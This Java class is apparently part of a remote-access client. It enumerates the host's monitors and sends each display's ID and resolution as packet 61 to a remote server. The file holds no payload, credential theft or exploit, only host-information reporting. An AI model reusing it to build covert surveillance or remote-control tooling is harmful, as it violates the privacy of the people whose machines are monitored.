package com.redpois0n;

import java.awt.GraphicsDevice;
import java.awt.Rectangle;
import java.io.DataOutputStream;

import com.redpois0n.common.io.StringWriter;
import com.redpois0n.packets.outgoing.AbstractOutgoingPacket;

public class Packet61Monitors extends AbstractOutgoingPacket {
	
	private GraphicsDevice[] graphicsDevices;
	
	public Packet61Monitors(GraphicsDevice[] graphicsDevices) {
		this.graphicsDevices = graphicsDevices;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		dos.writeInt(graphicsDevices.length);
		
		for (GraphicsDevice device : graphicsDevices) {
			Rectangle screenBounds = device.getDefaultConfiguration().getBounds();
			String id = device.getIDstring();
			if (id.startsWith("\\")) {
				id = id.substring(1, id.length());
			}
			sw.writeLine(id + ": " + screenBounds.width + "x" + screenBounds.height);
		}
	}

	@Override
	public byte getPacketId() {
		return (byte) 61;
	}

}
